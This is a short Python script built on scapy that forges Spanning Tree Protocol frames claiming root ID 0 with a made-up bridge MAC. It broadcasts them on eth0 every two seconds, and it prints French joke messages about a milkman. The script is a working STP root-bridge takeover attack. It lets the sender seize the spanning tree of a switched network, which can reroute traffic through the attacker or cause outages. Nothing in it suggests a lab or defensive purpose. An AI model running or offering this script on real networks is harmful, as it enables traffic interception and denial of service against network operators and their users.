from scapy.all import *
import time

interface = "eth0"
stp_multicast = "01:80:c2:00:00:00"

pkt = Dot3(dst=stp_multicast) / \
      LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
      STP(rootid=0, rootmac="aa:bb:cc:dd:ee:ff", bridgeid=0, bridgemac="aa:bb:cc:dd:ee:ff")

print(f"{interface} est le laitier, son lait est délicieux")

try:
    while True:
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("\nAh non c'est du lait pasterisé")
